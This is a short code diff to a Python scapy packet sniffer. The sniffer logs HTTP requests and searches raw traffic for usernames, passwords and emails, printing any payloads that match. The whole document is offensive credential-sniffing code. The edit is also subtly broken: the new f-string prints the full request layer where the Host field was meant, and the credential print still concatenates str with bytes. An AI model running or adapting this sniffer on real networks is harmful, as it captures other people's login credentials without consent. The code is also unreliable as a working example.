@@ -23,15 +23,13 @@ def sniff(iface):
 def process_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         print(
-            "[+] Http Request >> "
-            + packet[http.HTTPRequest].Host
-            + packet[http.HTTPRequest].Path
+            f"[+] Http Request >> {packet[http.HTTPRequest]} {packet[http.HTTPRequest].Path}"
         )
         if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load
             keys = ["username", "password", "pass", "email"]
             for key in keys:
-                if key in load:
+                if key.encode() in load:
                     print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
                     break
 
